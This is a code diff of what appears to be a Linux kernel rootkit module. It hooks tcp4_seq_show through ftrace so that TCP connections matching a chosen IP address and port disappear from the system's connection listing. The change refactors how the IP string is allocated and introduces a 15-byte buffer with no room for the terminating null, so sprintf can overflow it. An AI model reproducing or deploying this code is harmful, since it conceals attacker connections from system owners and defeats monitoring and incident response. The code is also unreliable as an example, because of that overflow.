@@ -4,7 +4,7 @@
 #include <linux/ftrace.h>
 #include <net/inet_sock.h>
 
-// Function prototype
+// Function prototype.
 void callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct pt_regs *regs);
 
 // Types & other consts.
@@ -18,8 +18,9 @@ typedef int (*original_tcp4_seq_show_t)(struct seq_file *seq, void *v);
 static unsigned long tcp4_seq_show_address; 
 static original_tcp4_seq_show_t original_tcp4_seq_ptr;
 static struct ftrace_ops ops = { .func = callback_func, .flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY };
+static const int IP_STRING_MAX_LEN = 15;
 
-char* ipaddr_to_string(__be32 ipaddr)
+void ipaddr_to_string(__be32 ipaddr, char* ipaddr_string)
 {
     int first = (unsigned char)(ipaddr & 0xFF);
     int second = (unsigned char)((ipaddr >> 8) & 0xFF);
@@ -27,10 +28,7 @@ char* ipaddr_to_string(__be32 ipaddr)
     int fourth = (unsigned char)((ipaddr >> 24) & 0xFF);
 
     // Maximum length of an ip string in ipv4
-    char *buffer = kmalloc(15 * 8, GFP_KERNEL);
-    sprintf(buffer, "%d.%d.%d.%d", first, second, third, fourth);
-
-    return buffer;
+    sprintf(ipaddr_string, "%d.%d.%d.%d", first, second, third, fourth);
 }
 
 int new_tcp4_seq_show(struct seq_file *seq, void *v) {
@@ -43,7 +41,8 @@ int new_tcp4_seq_show(struct seq_file *seq, void *v) {
     __be32 ipaddr = inet->inet_saddr;
     __u16 port = ntohs(inet->inet_sport);
     
-    char *ipstring = ipaddr_to_string(ipaddr);
+    char *ipstring = kmalloc(IP_STRING_MAX_LEN, GFP_KERNEL);
+    ipaddr_to_string(ipaddr, ipstring);
     if (((ip_to_hide == NULL) && (port == port_to_hide)) || ((ip_to_hide != NULL) && !strcmp(ipstring, ip_to_hide) && (port == port_to_hide))) {
         printk(KERN_ALERT "Hiding %s : %u", ipstring, port);
         kfree(ipstring);
